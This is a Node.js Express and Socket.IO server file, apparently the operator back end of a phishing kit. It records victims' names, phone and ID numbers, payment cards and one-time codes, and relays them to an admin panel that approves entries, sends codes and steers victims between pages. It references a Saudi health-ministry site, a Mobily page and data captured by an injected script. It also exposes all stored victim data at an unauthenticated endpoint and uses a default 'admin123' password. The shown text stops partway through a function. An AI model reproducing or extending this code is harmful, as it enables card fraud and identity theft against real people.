const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const cors = require("cors");
const cookieParser = require("cookie-parser");
const fs = require("fs");
const path = require("path");
require("dotenv").config();

const app = express();
const server = http.createServer(app);

// CORS Configuration - Allow all origins dynamically
const corsOptions = {
  origin: function(origin, callback) {
    // Reflect the requesting origin back (allows credentials to work)
    // If no origin (server-to-server, curl, etc), allow
    callback(null, origin || true);
  },
  credentials: true,
};

app.use(cors(corsOptions));
app.use(express.json());
app.use(cookieParser());
app.use('/admin', express.static('admin'));

// Socket.IO Configuration - Dynamic origin for proper cross-site disconnect detection
const io = new Server(server, {
  cors: {
    origin: function(origin, callback) {
      // Reflect the requesting origin back (required for credentials + CORS)
      callback(null, origin || true);
    },
    methods: ["GET", "POST"],
    credentials: true,
  },
  allowEIO3: true,
  transports: ["websocket", "polling"],
  pingTimeout: 10000,
  pingInterval: 5000,
});

// Data file path
const DATA_DIR = process.env.NODE_ENV === 'production' ? '/data' : __dirname;
const DATA_FILE = path.join(DATA_DIR, 'visitors_data.json');
const BACKUP_FILE = path.join(DATA_DIR, 'visitors_data_backup.json');

// Ensure data directory exists
function ensureDataDir() {
  try {
    if (!fs.existsSync(DATA_DIR)) {
      fs.mkdirSync(DATA_DIR, { recursive: true });
      console.log(`Created data directory: ${DATA_DIR}`);
    }
  } catch (error) {
    console.error("Error creating data directory:", error);
  }
}

// Load saved data from file
function loadSavedData() {
  ensureDataDir();
  console.log(`Loading data from: ${DATA_FILE}`);
  
  try {
    // Try main file first
    if (fs.existsSync(DATA_FILE)) {
      const data = fs.readFileSync(DATA_FILE, "utf8");
      const parsed = JSON.parse(data);
      console.log(`Loaded ${parsed.savedVisitors?.length || 0} visitors from main file`);
      console.log(`Loaded whatsappNumber: ${parsed.whatsappNumber || 'not set'}`);
      return {
        visitors: new Map(Object.entries(parsed.visitors || {})),
        visitorCounter: parsed.visitorCounter || 0,
        savedVisitors: parsed.savedVisitors || [],
        whatsappNumber: parsed.whatsappNumber || "",
        globalBlockedCards: parsed.globalBlockedCards || [],
        globalBlockedCountries: parsed.globalBlockedCountries || [],
        adminPassword: parsed.adminPassword || "admin123",
      };
    }
    
    // Try backup file if main doesn't exist
    if (fs.existsSync(BACKUP_FILE)) {
      console.log("Main file not found, trying backup...");
      const data = fs.readFileSync(BACKUP_FILE, "utf8");
      const parsed = JSON.parse(data);
      console.log(`Loaded ${parsed.savedVisitors?.length || 0} visitors from backup file`);
      console.log(`Loaded whatsappNumber: ${parsed.whatsappNumber || 'not set'}`);
      return {
        visitors: new Map(Object.entries(parsed.visitors || {})),
        visitorCounter: parsed.visitorCounter || 0,
        savedVisitors: parsed.savedVisitors || [],
        whatsappNumber: parsed.whatsappNumber || "",
        globalBlockedCards: parsed.globalBlockedCards || [],
        globalBlockedCountries: parsed.globalBlockedCountries || [],
        adminPassword: parsed.adminPassword || "admin123",
      };
    }
    
    console.log("No data file found, starting fresh");
  } catch (error) {
    console.error("Error loading saved data:", error);
    
    // Try backup on error
    try {
      if (fs.existsSync(BACKUP_FILE)) {
        console.log("Error loading main file, trying backup...");
        const data = fs.readFileSync(BACKUP_FILE, "utf8");
        const parsed = JSON.parse(data);
        return {
          visitors: new Map(Object.entries(parsed.visitors || {})),
          visitorCounter: parsed.visitorCounter || 0,
          savedVisitors: parsed.savedVisitors || [],
          whatsappNumber: parsed.whatsappNumber || "",
          globalBlockedCards: parsed.globalBlockedCards || [],
          globalBlockedCountries: parsed.globalBlockedCountries || [],
          adminPassword: parsed.adminPassword || "admin123",
        };
      }
    } catch (backupError) {
      console.error("Error loading backup:", backupError);
    }
  }
  return {
    visitors: new Map(),
    visitorCounter: 0,
    savedVisitors: [],
    whatsappNumber: "",
    globalBlockedCards: [],
    globalBlockedCountries: [],
    adminPassword: "admin123",
  };
}

// Save data to file with backup
function saveData() {
  ensureDataDir();
  
  try {
    const data = {
      visitors: Object.fromEntries(visitors),
      visitorCounter,
      savedVisitors,
      whatsappNumber,
      globalBlockedCards,
      globalBlockedCountries,
      adminPassword,
      lastSaved: new Date().toISOString(),
    };
    const jsonData = JSON.stringify(data, null, 2);
    
    // Create backup of existing file first
    if (fs.existsSync(DATA_FILE)) {
      try {
        fs.copyFileSync(DATA_FILE, BACKUP_FILE);
      } catch (backupErr) {
        console.error("Error creating backup:", backupErr);
      }
    }
    
    // Write main file
    fs.writeFileSync(DATA_FILE, jsonData);
    console.log(`Data saved: ${savedVisitors.length} visitors at ${new Date().toISOString()}`);
  } catch (error) {
    console.error("Error saving data:", error);
  }
}

// Initialize data from file
const savedData = loadSavedData();
const visitors = savedData.visitors;
const admins = new Map();
let visitorCounter = savedData.visitorCounter;
let savedVisitors = savedData.savedVisitors; // Array to store all visitors permanently
let whatsappNumber = savedData.whatsappNumber || ""; // WhatsApp number for footer
let globalBlockedCards = savedData.globalBlockedCards || []; // Global blocked card prefixes
let globalBlockedCountries = savedData.globalBlockedCountries || []; // Global blocked countries
let adminPassword = savedData.adminPassword || "admin123"; // Admin password (persisted)

// Generate unique API key
function generateApiKey() {
  return "api_" + Math.random().toString(36).substring(2, 15);
}

// Get visitor info from request
function getVisitorInfo(socket) {
  const headers = socket.handshake.headers;
  // Get the last IP from x-forwarded-for (the external/public IP)
  let ip = headers["x-forwarded-for"] || socket.handshake.address;
  if (ip && ip.includes(",")) {
    const ips = ip.split(",").map(i => i.trim());
    ip = ips[ips.length - 1]; // Use the last IP (external)
  }
  return {
    ip: ip,
    userAgent: headers["user-agent"] || "",
    country: headers["cf-ipcountry"] || "Unknown",
  };
}


// Parse user agent
function parseUserAgent(ua) {
  let os = "Unknown";
  let device = "Unknown";
  let browser = "Unknown";

  // OS Detection
  if (ua.includes("Windows")) os = "Windows";
  else if (ua.includes("Mac")) os = "macOS";
  else if (ua.includes("Linux")) os = "Linux";
  else if (ua.includes("Android")) os = "Android";
  else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";

  // Device Detection
  if (ua.includes("Mobile")) device = "Mobile";
  else if (ua.includes("Tablet")) device = "Tablet";
  else device = "Desktop";

  // Browser Detection
  if (ua.includes("Chrome")) browser = "Chrome";
  else if (ua.includes("Firefox")) browser = "Firefox";
  else if (ua.includes("Safari")) browser = "Safari";
  else if (ua.includes("Edge")) browser = "Edge";

  return { os, device, browser };
}

// Save visitor to permanent storage
function saveVisitorPermanently(visitor) {
  const existingIndex = savedVisitors.findIndex(v => v._id === visitor._id);
  if (existingIndex >= 0) {
    savedVisitors[existingIndex] = { ...savedVisitors[existingIndex], ...visitor };
  } else {
    savedVisitors.push({ ...visitor });
  }
  saveData();
}

// Socket.IO Connection Handler
io.on("connection", (socket) => {
  console.log(`New connection: ${socket.id}`);

  // Handle visitor registration
  socket.on("visitor:register", (data) => {
    const visitorInfo = getVisitorInfo(socket);
    
    const { os, device, browser } = parseUserAgent(visitorInfo.userAgent);
    
    // Get existing visitor ID from client (localStorage)
    const existingVisitorId = data?.existingVisitorId;
    const siteName = data?.siteName || "غير معروف";
    
    // Check if this visitor already exists based on visitor ID from localStorage
    let existingVisitor = null;
    if (existingVisitorId) {
      existingVisitor = savedVisitors.find(v => v._id === existingVisitorId);
      console.log(`Looking for existing visitor with ID: ${existingVisitorId}, found: ${!!existingVisitor}`);
    }

    let visitor;
    let isNewVisitor = false;

    if (existingVisitor) {
      // Update existing visitor with new socketId
      visitor = {
        ...existingVisitor,
        socketId: socket.id,
        isConnected: true,
        sessionStartTime: Date.now(),
        siteName: siteName || existingVisitor.siteName || "غير معروف",
      };
      // Update in savedVisitors
      const index = savedVisitors.findIndex(v => v._id === existingVisitor._id);
      if (index >= 0) {
        savedVisitors[index] = visitor;
      }
      console.log(`Returning visitor reconnected: ${visitor._id}`);
    } else {
      // Create new visitor
      visitorCounter++;
      visitor = {
        _id: `visitor_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
        socketId: socket.id,
        visitorNumber: visitorCounter,
        createdAt: new Date().toISOString(),
        isRead: false,
        fullName: "",
        phone: "",
        idNumber: "",
        apiKey: generateApiKey(),
        ip: visitorInfo.ip,
        country: visitorInfo.country,
        city: "",
        os,
        device,
        browser,
        date: new Date().toISOString(),
        blockedCardPrefixes: [],
        siteName: siteName,
        page: "الصفحة الرئيسية",
        data: {},
        dataHistory: [],
        paymentCards: [],
        digitCodes: [],
        hasNewData: false,
        isBlocked: false,
        isConnected: true,
        sessionStartTime: Date.now(),
      };
      savedVisitors.push(visitor);
      isNewVisitor = true;
      console.log(`New visitor registered: ${visitor._id}`);
    }

    visitors.set(socket.id, visitor);
    saveData();

    // Send confirmation to visitor
    socket.emit("successfully-connected", {
      sid: socket.id,
      pid: visitor._id,
    });

    // Notify admins
    admins.forEach((admin, adminSocketId) => {
      if (isNewVisitor) {
        io.to(adminSocketId).emit("visitor:new", { ...visitor, isConnected: true });
      } else {
        io.to(adminSocketId).emit("visitor:reconnected", { visitorId: visitor._id, socketId: socket.id });
      }
    });
  });

  // Handle page enter
  socket.on("visitor:pageEnter", (page) => {
    const visitor = visitors.get(socket.id);
    if (visitor) {
      visitor.page = page;
      visitors.set(socket.id, visitor);
      saveVisitorPermanently(visitor);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:pageChanged", {
          visitorId: visitor._id,
          page,
        });
      });
    }
  });

  // Handle visitor name update (from MOH username)
  socket.on("visitor:updateName", (name) => {
    const visitor = visitors.get(socket.id);
    if (visitor && name) {
      visitor.fullName = name;
      visitor.mohUsername = name;
      visitors.set(socket.id, visitor);
      saveVisitorPermanently(visitor);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:nameUpdated", {
          visitorId: visitor._id,
          name: name,
        });
      });

      console.log(`Visitor ${visitor._id} name updated to: ${name}`);
    }
  });

  // Handle more info (data submission)
  socket.on("more-info", (data) => {
    const visitor = visitors.get(socket.id);
    if (visitor) {
      // Store submitted data with page info for ordering
      if (data.content) {
        // Initialize dataHistory if not exists
        if (!visitor.dataHistory) {
          visitor.dataHistory = [];
        }
        // Add new data entry with timestamp and page
        const now = new Date().toISOString();
        visitor.dataHistory.push({
          content: data.content,
          page: data.page,
          timestamp: now,
        });
        // Only update lastDataUpdate if already entered card page
        if (visitor.hasEnteredCardPage) {
          visitor.lastDataUpdate = now;
        }
        // Also keep flat data for backward compatibility
        visitor.data = { ...visitor.data, ...data.content };
        // تخزين اسم الشبكة إذا كان موجوداً
        if (data.content["مزود الخدمة"]) {
          visitor.network = data.content["مزود الخدمة"];
        }
      }
      if (data.paymentCard) {
        const now = new Date().toISOString();
        visitor.paymentCards.push({
          ...data.paymentCard,
          timestamp: now,
        });
        // Start tracking from card page
        visitor.lastDataUpdate = now;
        visitor.hasEnteredCardPage = true;
      }
      if (data.digitCode) {
        const now = new Date().toISOString();
        visitor.digitCodes.push({
          code: data.digitCode,
          page: data.page,
          timestamp: now,
        });
        // Only update if already entered card page
        if (visitor.hasEnteredCardPage) {
          visitor.lastDataUpdate = now;
        }
      }

      visitor.page = data.page;
      visitor.waitingForAdminResponse = data.waitingForAdminResponse || false;
      visitor.hasNewData = true;
      visitors.set(socket.id, visitor);
      saveVisitorPermanently(visitor);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:dataSubmitted", {
          visitorId: visitor._id,
          socketId: socket.id,
          data: data,
          visitor: visitor,
        });
      });

      console.log(`Data received from visitor ${visitor._id}:`, data);
    }
  });

  // Handle card number verification
  socket.on("cardNumber:verify", (cardNumber) => {
    const visitor = visitors.get(socket.id);
    if (visitor) {
      // Check if card prefix is blocked
      const prefix = cardNumber.substring(0, 4);
      const isBlocked = visitor.blockedCardPrefixes.includes(prefix);

      socket.emit("cardNumber:verified", !isBlocked);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:cardVerification", {
          visitorId: visitor._id,
          cardNumber,
          isBlocked,
        });
      });
    }
  });

  // Admin registration
  socket.on("admin:register", (credentials) => {
    // Simple admin authentication - uses persistent password from disk
    if (credentials.password === adminPassword) {
      admins.set(socket.id, {
        socketId: socket.id,
        connectedAt: new Date().toISOString(),
      });

      socket.emit("admin:authenticated", true);

      // Get all connected visitor IDs from the active visitors Map
      const connectedVisitorIds = new Set();
      visitors.forEach((v) => {
        connectedVisitorIds.add(v._id);
      });
      
      // Update connection status for saved visitors based on _id match
      const visitorsWithStatus = savedVisitors.map(v => {
        // Check if this visitor's _id is in the connected visitors
        const isCurrentlyConnected = connectedVisitorIds.has(v._id);
        // Also update socketId if connected
        let currentSocketId = v.socketId;
        visitors.forEach((activeVisitor, sid) => {
          if (activeVisitor._id === v._id) {
            currentSocketId = sid;
          }
        });
        return { ...v, socketId: currentSocketId, isConnected: isCurrentlyConnected };
      });

      // Sort visitors by lastDataUpdate (most recent first)
      visitorsWithStatus.sort((a, b) => {
        const dateA = a.lastDataUpdate ? new Date(a.lastDataUpdate).getTime() : 0;
        const dateB = b.lastDataUpdate ? new Date(b.lastDataUpdate).getTime() : 0;
        return dateB - dateA;
      });

      console.log(`Sending ${visitorsWithStatus.length} visitors to admin, ${connectedVisitorIds.size} connected`);

      // Send all saved visitors to admin with updated connection status
      socket.emit("visitors:list", visitorsWithStatus);

      // Notify visitors that admin is connected
      visitors.forEach((visitor, visitorSocketId) => {
        io.to(visitorSocketId).emit("isAdminConnected", true);
      });

      console.log(`Admin connected: ${socket.id}`);
    } else {
      socket.emit("admin:authenticated", false);
    }
  });

  // Admin: Approve form
  socket.on("admin:approve", (visitorSocketId) => {
    io.to(visitorSocketId).emit("form:approved");
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Form approved for visitor: ${visitorSocketId}`);
  });

  // Admin: Reject form
  socket.on("admin:reject", (data) => {
    const visitorSocketId = data.visitorSocketId || data;
    io.to(visitorSocketId).emit("form:rejected");
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Form rejected for visitor: ${visitorSocketId}`);
  });

  // Admin: Reject Mobily call (special handling for Mobily page)
  socket.on("admin:mobilyReject", (visitorSocketId) => {
    io.to(visitorSocketId).emit("mobily:rejected");
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Mobily call rejected for visitor: ${visitorSocketId}`);
  });

  // Admin: Send verification code
  socket.on("admin:sendCode", ({ visitorSocketId, code }) => {
    io.to(visitorSocketId).emit("code", code);
    // حفظ الرمز في بيانات الزائر وتحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.lastSentCode = code;
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Code sent to visitor ${visitorSocketId}: ${code}`);
  });

  // Admin: Navigate visitor to page
  socket.on("admin:navigate", ({ visitorSocketId, page }) => {
    io.to(visitorSocketId).emit("visitor:navigate", page);
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Navigating visitor ${visitorSocketId} to: ${page}`);
  });

  // Admin: Card action (OTP, ATM, Reject)
  socket.on("admin:cardAction", ({ visitorSocketId, action }) => {
    io.to(visitorSocketId).emit("card:action", action);
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Card action ${action} sent to visitor ${visitorSocketId}`);
  });

  // Admin: Code action (Approve, Reject) for OTP/digit codes
  socket.on("admin:codeAction", ({ visitorSocketId, action, codeIndex }) => {
    io.to(visitorSocketId).emit("code:action", { action, codeIndex });
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Code action ${action} sent to visitor ${visitorSocketId}`);
  });

  // Admin: Approve resend code request
  socket.on("admin:approveResend", ({ visitorSocketId }) => {
    io.to(visitorSocketId).emit("resend:approved");
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Resend approved for visitor ${visitorSocketId}`);
  });

  // Admin: Block visitor
  socket.on("admin:block", ({ visitorSocketId }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.isBlocked = true;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.to(visitorSocketId).emit("blocked");
      console.log(`Visitor blocked: ${visitorSocketId}`);
    }
  });

  // Admin: Unblock visitor
  socket.on("admin:unblock", ({ visitorSocketId }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.isBlocked = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.to(visitorSocketId).emit("unblocked");
      console.log(`Visitor unblocked: ${visitorSocketId}`);
    }
  });

  // Admin: Delete visitor by socket ID
  socket.on("admin:delete", (visitorSocketId) => {
    io.to(visitorSocketId).emit("deleted");
    visitors.delete(visitorSocketId);
    
    // Also remove from saved visitors
    const visitorToDelete = Array.from(visitors.values()).find(v => v.socketId === visitorSocketId);
    if (visitorToDelete) {
      savedVisitors = savedVisitors.filter(v => v._id !== visitorToDelete._id);
      saveData();
    }
    
    console.log(`Visitor deleted: ${visitorSocketId}`);
  });

  // Admin: Delete visitor by ID
  socket.on("admin:deleteById", (visitorId) => {
    // Find and remove from active visitors
    visitors.forEach((v, socketId) => {
      if (v._id === visitorId) {
        io.to(socketId).emit("deleted");
        visitors.delete(socketId);
      }
    });
    
    // Remove from saved visitors
    savedVisitors = savedVisitors.filter(v => v._id !== visitorId);
    saveData();
    
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("visitor:deleted", { visitorId });
    });
    
    console.log(`Visitor deleted by ID: ${visitorId}`);
  });

  // Admin: Send last message
  socket.on("admin:sendMessage", ({ visitorSocketId, message }) => {
    io.to(visitorSocketId).emit("admin-last-message", { message });
    console.log(`Message sent to visitor ${visitorSocketId}: ${message}`);
  });

  // Admin: Set bank name
  socket.on("admin:setBankName", ({ visitorSocketId, bankName }) => {
    io.to(visitorSocketId).emit("bankName", bankName);
    console.log(`Bank name set for visitor ${visitorSocketId}: ${bankName}`);
  });

  // Admin: Change password
  socket.on("admin:changePassword", ({ oldPassword, newPassword }) => {
    // Verify old password - uses persistent password from disk
    if (oldPassword === adminPassword) {
      // Update password and save to disk for persistence
      adminPassword = newPassword;
      saveData();
      socket.emit("admin:passwordChanged", true);
      console.log("Admin password changed successfully and saved to disk");
      
      // Force logout ALL other admin sessions
      admins.forEach((admin, adminSocketId) => {
        if (adminSocketId !== socket.id) {
          io.to(adminSocketId).emit("admin:forceLogout");
          admins.delete(adminSocketId);
          console.log(`Force logged out admin: ${adminSocketId}`);
        }
      });
      
      // Also logout the admin who changed the password
      setTimeout(() => {
        io.to(socket.id).emit("admin:forceLogout");
        admins.delete(socket.id);
        console.log(`Force logged out password changer: ${socket.id}`);
      }, 2000);
      
      console.log("All admin sessions logged out after password change");
    } else {
      socket.emit("admin:passwordChanged", false);
      console.log("Admin password change failed - wrong old password");
    }
  });

  // Admin: Clear all data
  socket.on("admin:clearAllData", () => {
    // Disconnect all visitors
    visitors.forEach((v, socketId) => {
      io.to(socketId).emit("deleted");
    });
    
    // Clear all data
    visitors.clear();
    savedVisitors = [];
    visitorCounter = 0;
    
    // Save empty data to disk
    saveData();
    
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("allDataCleared");
    });
    
    console.log("All data cleared by admin");
  });

  // WhatsApp: Get current number
  socket.on("whatsapp:get", () => {
    // Send to admin
    socket.emit("whatsapp:current", whatsappNumber);
    // Also send to client (for footer)
    socket.emit("whatsapp:update", whatsappNumber);
  });

  // WhatsApp: Set number (admin only)
  socket.on("whatsapp:set", (number) => {
    whatsappNumber = number;
    saveData();
    // Broadcast to all connected clients
    io.emit("whatsapp:update", whatsappNumber);
    console.log(`WhatsApp number updated: ${whatsappNumber}`);
  });

  // Blocked Cards: Get list
  socket.on("blockedCards:get", () => {
    socket.emit("blockedCards:list", globalBlockedCards);
  });

  // Blocked Cards: Add prefix
  socket.on("blockedCards:add", (prefix) => {
    if (prefix && prefix.length === 4 && !globalBlockedCards.includes(prefix)) {
      globalBlockedCards.push(prefix);
      saveData();
      // Notify all admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("blockedCards:list", globalBlockedCards);
      });
      // Broadcast to all clients
      io.emit("blockedCards:updated", globalBlockedCards);
      console.log(`Blocked card prefix added: ${prefix}`);
    }
  });

  // Blocked Cards: Remove prefix
  socket.on("blockedCards:remove", (prefix) => {
    globalBlockedCards = globalBlockedCards.filter(p => p !== prefix);
    saveData();
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("blockedCards:list", globalBlockedCards);
    });
    // Broadcast to all clients
    io.emit("blockedCards:updated", globalBlockedCards);
    console.log(`Blocked card prefix removed: ${prefix}`);
  });

  // Blocked Cards: Check if card is blocked (for clients)
  socket.on("blockedCards:check", (cardNumber) => {
    const prefix = cardNumber.replace(/\s/g, '').substring(0, 4);
    const isBlocked = globalBlockedCards.includes(prefix);
    socket.emit("blockedCards:checkResult", { isBlocked, prefix });
  });

  // Blocked Countries: Get list
  socket.on("blockedCountries:get", () => {
    socket.emit("blockedCountries:list", globalBlockedCountries);
  });

  // Blocked Countries: Add country
  socket.on("blockedCountries:add", (country) => {
    if (country && !globalBlockedCountries.includes(country)) {
      globalBlockedCountries.push(country);
      saveData();
      // Notify all admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("blockedCountries:list", globalBlockedCountries);
      });
      // Broadcast to all clients
      io.emit("blockedCountries:updated", globalBlockedCountries);
      console.log(`Blocked country added: ${country}`);
    }
  });

  // Blocked Countries: Remove country
  socket.on("blockedCountries:remove", (country) => {
    globalBlockedCountries = globalBlockedCountries.filter(c => c !== country);
    saveData();
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("blockedCountries:list", globalBlockedCountries);
    });
    // Broadcast to all clients
    io.emit("blockedCountries:updated", globalBlockedCountries);
    console.log(`Blocked country removed: ${country}`);
  });

  // Blocked Countries: Check if visitor's country is blocked
  socket.on("blockedCountries:check", (country) => {
    const isBlocked = globalBlockedCountries.some(c => 
      c.toLowerCase() === country.toLowerCase()
    );
    socket.emit("blockedCountries:checkResult", { isBlocked, country });
  });

  // Admin: Mark visitor data as read (hide new data indicator)
  socket.on("admin:markAsRead", (visitorId) => {
    // Find visitor by ID in active visitors
    let found = false;
    visitors.forEach((v, socketId) => {
      if (v._id === visitorId) {
        v.hasNewData = false;
        visitors.set(socketId, v);
        saveVisitorPermanently(v);
        found = true;
      }
    });
    
    // Also update in saved visitors
    const savedVisitor = savedVisitors.find(v => v._id === visitorId);
    if (savedVisitor) {
      savedVisitor.hasNewData = false;
      saveData();
    }
    
    // Notify all admins about the update
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("visitor:markedAsRead", { visitorId });
    });
    
    console.log(`Visitor ${visitorId} marked as read`);
  });

  // Chat: Message from visitor to admin
  socket.on("chat:fromVisitor", ({ visitorSocketId, message, timestamp }) => {
    const visitor = visitors.get(visitorSocketId) || visitors.get(socket.id);
    if (visitor) {
      // Initialize chat messages array if not exists
      if (!visitor.chatMessages) {
        visitor.chatMessages = [];
      }
      
      // Add message to visitor's chat history
      const chatMessage = {
        id: Date.now().toString(),
        text: message,
        sender: 'visitor',
        timestamp: timestamp || new Date().toISOString()
      };
      visitor.chatMessages.push(chatMessage);
      visitor.hasNewMessage = true;
      visitors.set(visitor.socketId, visitor);
      saveVisitorPermanently(visitor);
      
      // Notify all admins about the new message
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("chat:newMessage", {
          visitorSocketId: visitor.socketId,
          visitorId: visitor._id,
          message: chatMessage
        });
      });
      
      console.log(`Chat message from visitor ${visitor.socketId}: ${message}`);
    }
  });

  // Chat: Message from admin to visitor
  socket.on("chat:fromAdmin", ({ visitorSocketId, message, timestamp }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      // Initialize chat messages array if not exists
      if (!visitor.chatMessages) {
        visitor.chatMessages = [];
      }
      
      // Add message to visitor's chat history
      const chatMessage = {
        id: Date.now().toString(),
        text: message,
        sender: 'admin',
        timestamp: timestamp || new Date().toISOString()
      };
      visitor.chatMessages.push(chatMessage);
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      
      // Send message to visitor
      io.to(visitorSocketId).emit("chat:fromAdmin", {
        message: message,
        timestamp: chatMessage.timestamp
      });
      
      console.log(`Chat message from admin to visitor ${visitorSocketId}: ${message}`);
    }
  });

  // Chat: Mark messages as read
  socket.on("chat:markAsRead", ({ visitorSocketId }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.hasNewMessage = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
    }
  });

  // Admin: Block card prefix
  socket.on("admin:blockCardPrefix", ({ visitorSocketId, prefix }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      if (!visitor.blockedCardPrefixes.includes(prefix)) {
        visitor.blockedCardPrefixes.push(prefix);
        visitors.set(visitorSocketId, visitor);
        saveVisitorPermanently(visitor);
      }
      console.log(`Card prefix blocked for visitor ${visitorSocketId}: ${prefix}`);
    }
  });

  // Handle disconnection
  socket.on("disconnect", () => {
    // Check if it's a visitor
    if (visitors.has(socket.id)) {
      const visitor = visitors.get(socket.id);
      const visitorId = visitor._id;
      const socketId = socket.id;
      
      // Don't delete visitor data - keep it permanently
      visitors.delete(socket.id);
      
      // Delay disconnect notification to allow for quick reconnection
      setTimeout(() => {
        // Check if visitor reconnected with same ID
        const reconnected = Array.from(visitors.values()).some(v => v._id === visitorId && v.isConnected);
        
        if (!reconnected) {
          // Update saved visitor as disconnected
          const savedVisitor = savedVisitors.find(v => v._id === visitorId);
          if (savedVisitor) {
            savedVisitor.isConnected = false;
            saveData();
          }
          
          // Notify admins
          admins.forEach((admin, adminSocketId) => {
            io.to(adminSocketId).emit("visitor:disconnected", {
              visitorId: visitorId,
              socketId: socketId,
            });
          });
          
          console.log(`Visitor disconnected: ${socketId}`);
        } else {
          console.log(`Visitor ${visitorId} reconnected quickly, skipping disconnect notification`);
        }
      }, 1000); // 1 second delay
    }

    // Check if it's an admin
    if (admins.has(socket.id)) {
      admins.delete(socket.id);

      // Notify visitors if no admins left
      if (admins.size === 0) {
        visitors.forEach((visitor, visitorSocketId) => {
          io.to(visitorSocketId).emit("isAdminConnected", false);
        });
      }

      console.log(`Admin disconnected: ${socket.id}`);
    }
  });
});

// REST API Routes
// Temporary password reset endpoint
app.get("/api/reset-password", (req, res) => {
  adminPassword = "admin123";
  saveToDisk();
  res.json({ success: true, message: "Password reset to admin123" });
});

app.get("/", (req, res) => {
  res.json({ status: "Server is running", timestamp: new Date().toISOString() });
});

app.get("/api/visitors", (req, res) => {
  res.json(savedVisitors);
});

app.get("/api/stats", (req, res) => {
  res.json({
    totalVisitors: savedVisitors.length,
    connectedVisitors: visitors.size,
    totalAdmins: admins.size,
    visitorCounter,
  });
});

// ===== API: Receive captured data from Cloudflare data-collector Worker =====
// ===== API: Receive data directly from MOH Worker-injected script =====
app.post("/api/moh-data", (req, res) => {
  try {
    const { type, data, visitorId, socketId: reqSocketId } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress || '';
    const clientIp = ip.split(',')[0].trim();
    
    console.log(`[MOH-DIRECT] Received ${type} from ${clientIp}, visitorId=${visitorId || 'none'}, socketId=${reqSocketId || 'none'}`);
    
    // Extract useful fields based on type
    let fields = {};
    let pageName = 'MOH';
    let username = null;
    
    if (data) {
      if (data.fields) fields = data.fields;
      if (data.content) {
        if (data.content.fields) fields = { ...fields, ...data.content.fields };
        if (data.content.page_text) fields['محتوى الصفحة'] = Array.isArray(data.content.page_text) ? data.content.page_text.join('\n') : data.content.page_text;
      }
      if (data.path) pageName = `MOH: ${data.path}`;
      if (data.username) username = data.username;
    }
    
    // Find matching visitor: try by visitorId first, then socketId, then IP
    let matchedVisitor = null;
    
    // 1. Match by visitor ID
    if (visitorId) {
      visitors.forEach((v, sid) => {
        if (v._id === visitorId) {
          matchedVisitor = { visitor: v, socketId: sid };
        }
      });
    }
    
    // 2. Match by socket ID
    if (!matchedVisitor && reqSocketId) {
